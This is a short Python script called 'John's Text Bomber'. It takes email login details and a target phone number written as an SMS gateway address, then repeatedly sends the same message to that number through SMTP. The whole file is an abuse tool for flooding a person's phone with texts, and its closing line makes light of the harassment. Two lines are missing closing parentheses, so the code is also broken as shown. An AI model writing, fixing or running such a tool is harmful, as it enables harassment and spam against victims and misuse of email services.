## John's Text Bomber ##
import time
import smtplib

#CONFIG. You can change any of the values on the right.
email_provider = str(input('smtp.gmail.com')) #server for your email- see ReadMe on github
email_address = str(input("YourEmail@gmail.com")) #your email
email_port = str(input("Port for email server - see Readme on github")) #port for email server- see ReadMe on github
password = str(input("password of your email")) #your email password
msg = str(input("Your message that you want sent to target")) #your txt message
text_amount = int(input("amount sent")
target_email = str(input("5551234567@mms.att.net target number. must be in email form- see ReadMe on github"))
wait = int(input("seconds in between messages")
#END CONFIG

### DO NOT EDIT BELOW THIS LINE ###
server = smtplib.SMTP(email_provider, email_port)
server.starttls()
server.login(email_address, password)
for _ in range(0,text_amount):
    server.sendmail(email_address,target_email,msg)
    print("sent")
    time.sleep(wait)
print("{} texts were sent. Hope you had a good time ;)".format(text_amount))
server.quit()
